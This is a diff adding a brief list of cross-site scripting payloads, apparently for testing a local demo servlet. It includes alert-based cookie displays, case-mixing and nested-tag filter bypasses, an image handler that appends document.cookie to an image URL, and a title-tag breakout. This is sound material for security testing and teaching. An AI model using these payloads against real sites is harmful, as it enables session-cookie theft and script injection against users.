@@ -1,0 +1,12 @@
+<script>alert("ARP! Feed me cookie!");</script>
+<script>alert("ARP! Feed me cookie! " + document.cookie);</script>
+<sCrIpT>alert(1);</ScRiPt>
+<scriscriptpt>alert(1);</sscriptcript>
+
+<img src="images/door.jpg" width=400 onmouseover="this.src='images/cookie.png?' + document.cookie"/>
+
+<a onmouseover="alert('Again');">MOUSE OVER! YOU WON'T BELIEVE WHAT HAPPENS NEXT!</a>
+
+http://localhost:8080/servlet-1.0/xss/?method=none&noheader=true
+
+</title><script src="somethinglocal.js"></script>
